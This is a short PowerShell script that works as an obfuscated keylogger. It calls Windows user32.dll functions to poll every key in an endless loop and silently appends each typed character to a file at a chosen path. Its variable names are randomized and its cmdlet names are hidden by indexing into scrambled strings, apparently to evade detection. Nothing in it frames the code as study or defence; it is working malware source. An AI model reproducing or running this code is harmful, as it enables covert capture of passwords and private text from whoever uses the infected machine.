param($path)
$KDIpAEtgq2 = $path; 
if ((Test-Path $KDIpAEtgq2) -eq $false) {New-Item $KDIpAEtgq2}
    $DNVicaO1rPfw0tg8FZzQ = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$oTyE92Iw1kBvKitx0m = Add-Type -MemberDefinition $DNVicaO1rPfw0tg8FZzQ -Name 'Win32' -Namespace API -PassThru

    while (1) {
        & (("iOFnqWDJLv6pUMTjfKNywG2IS8Xc7s0RaubYxg3Pz-h4lAHo9Z5eQCrBVEmtkd1")[24,59,32,54,59,41,24,44,51,51,11] -join '') -Milliseconds 40
        
        for ($E8AOp = 9; $E8AOp -le 254; $E8AOp++) {
        $2UjBdvSl0Jsih69paCQG = $oTyE92Iw1kBvKitx0m::GetAsyncKeyState($E8AOp)
         if ($2UjBdvSl0Jsih69paCQG -eq -32767) {
            $null = [console]::CapsLock

                    
                    $3zSyn0sdV5mK4cRoI = $oTyE92Iw1kBvKitx0m::MapVirtualKey($E8AOp, 3)

                    
                    $tj2 = & (("6fr9lWu8gCd7vnFJRzBpZ2mQIL54wUYObXcsNSA3EtMVDHGjTxhky-0PK1eiqoa")[36,58,28,53,31,32,47,58,34,41] -join '') -TypeName Byte[] -ArgumentList 256
                    $GlXQh = $oTyE92Iw1kBvKitx0m::GetKeyboardState($tj2)

                    
                    $hXue6VgWASGO = & (("gpwTbquEkhV0cMs17AQdlxynB46U2ofDX-IGiNHzr5mvZLJ83SYWFKP9ejORCta")[37,56,2,33,58,4,57,56,12,61] -join '') -TypeName System.Text.StringBuilder

                    
                    $n = $oTyE92Iw1kBvKitx0m::ToUnicode($E8AOp, $3zSyn0sdV5mK4cRoI, $tj2, $hXue6VgWASGO, $hXue6VgWASGO.Capacity, 0)

                    if ($n -and (& (("Q4OGXinPC15oZ8Lxh0-cHSvmbFDMUtRzdAr6pqKVJjua3Byw2W9INglYksET7ef")[59,61,57,29,18,7,43,29,16] -join '') $KDIpAEtgq2) -eq $true) {
                       
                        [System.IO.File]::AppendAllText($KDIpAEtgq2, $hXue6VgWASGO, [System.Text.Encoding]::Unicode)
                    }
         }
    }
}
